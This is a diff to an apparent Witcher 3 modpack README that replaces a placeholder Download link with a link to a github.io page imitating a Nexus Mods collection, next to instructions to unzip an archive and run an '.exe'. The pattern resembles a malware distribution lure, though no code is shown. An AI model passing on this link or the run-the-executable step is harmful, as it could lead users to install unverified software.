@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file – the mods will be automatically installed into your Witcher 3 mods folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://nexus-mod-collections-witcher3.github.io/.github/)
 
 ## 📸 Overview
 ![witcher3-nexus-modpack-visuals](https://github.com/user-attachments/assets/318b6094-0181-4c2b-9c87-46bf9050d95b)
